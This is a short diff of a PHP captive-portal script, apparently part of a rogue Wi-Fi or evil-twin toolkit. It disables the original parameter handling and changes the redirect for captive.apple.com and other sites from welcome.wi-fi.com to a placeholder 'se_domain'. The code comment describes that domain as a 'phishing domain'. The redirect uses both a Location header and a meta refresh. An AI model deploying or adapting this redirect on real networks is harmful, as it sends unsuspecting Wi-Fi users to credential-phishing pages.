@@ -1,4 +1,5 @@
 <?php
+    /*
 	// region Get params
 	$server_name = $_SERVER['SERVER_NAME'];
 	$client_ip = $_SERVER['REMOTE_ADDR'];
@@ -39,12 +40,13 @@
 		}
 	}
 	// endregion
+	*/
 
-	// region Site: captive.apple.com and other sites redirect to welcome.wi-fi.com
-	header('Location: http://welcome.wi-fi.com/');
+	// region Site: captive.apple.com and other sites redirect to phishing domain
+	header('Location: http://se_domain/');
 	if ($server_name == "captive.apple.com") {
 		http_response_code(200);
 	}
-	echo '<HTML><HEAD><TITLE> Web Authentication Redirect</TITLE><META http-equiv="Cache-control" content="no-cache"><META http-equiv="Pragma" content="no-cache"><META http-equiv="Expires" content="-1"><META http-equiv="refresh" content="1; URL=http://welcome.wi-fi.com/"></HEAD></HTML>';
+	echo '<HTML><HEAD><TITLE> Web Authentication Redirect</TITLE><META http-equiv="Cache-control" content="no-cache"><META http-equiv="Pragma" content="no-cache"><META http-equiv="Expires" content="-1"><META http-equiv="refresh" content="1; URL=http://se_domain/"></HEAD></HTML>';
 	exit(0);
 	// endregion
